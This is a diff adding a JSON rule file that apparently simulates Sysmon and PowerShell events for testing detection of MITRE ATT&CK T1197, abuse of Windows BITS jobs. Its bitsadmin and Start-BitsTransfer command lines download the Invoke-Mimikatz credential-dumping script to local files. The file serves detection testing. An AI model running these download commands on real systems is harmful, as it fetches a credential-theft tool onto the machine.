@@ -1,0 +1,52 @@
+{
+	"name": "T1197 - BITS Jobs",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Adversaries may abuse BITS to download, execute, and even clean up after malicious code.",
+	"rules": {
+		"bits_download": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing BITS to download file.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\bitsadmin.exe",
+				"Description": "BITS administration utility",
+				"CommandLine": "bitsadmin  /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 c:\\script.ps1"
+			}
+		},
+		"bits_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing BITS temp file.",
+			"payload": {
+				"ProcessId": 1152,
+				"Image": "C:\\Windows\\system32\\svchost.exe",
+				"TargetFilename": "C:\\BIT6779.tmp"
+			}
+		},
+		"bits_network": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Network connection detected",
+			"description": "Network activity from BITS.",
+			"payload": {
+				"ProcessId": 1152,
+				"Image": "C:\\Windows\\System32\\svchost.exe",
+				"DestinationIp": "151.101.132.133",
+				"DestinationPort": 443,
+				"DestinationPortName": "https"
+			}
+		},
+		"powershell_bits_download": {
+			"enabled": true,
+			"source": "PowerShell",
+			"category": "4104",
+			"description": "BITS PowerShell cmdlet.",
+			"payload": {
+				"ScriptBlockText": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 C:\\evil.ps1"
+			}
+		}
+	}
+}
